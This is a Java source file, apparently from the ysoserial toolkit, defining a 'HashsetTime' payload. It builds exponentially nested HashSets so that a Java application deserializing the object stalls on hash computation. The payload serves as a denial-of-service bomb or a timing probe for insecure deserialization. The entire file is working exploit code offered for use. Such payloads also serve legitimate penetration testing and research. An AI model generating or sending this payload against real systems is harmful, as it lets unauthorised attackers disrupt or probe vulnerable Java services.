package ysoserial.payloads;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.PayloadRunner;
import java.util.HashSet;
import java.util.Set;

@Authors({ Authors.BACKCOVER7 })
public class HashsetTime implements ObjectPayload<Object> {
    public Object getObject(final String command) throws Exception {
        int iter =Integer.parseInt(command);

        Set root = new HashSet();
        Set s1 = root;
        Set s2 = new HashSet();
        for (int i = 0; i < iter; i++) {
            Set t1 = new HashSet();
            Set t2 = new HashSet();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(HashsetTime.class, args);
    }
}
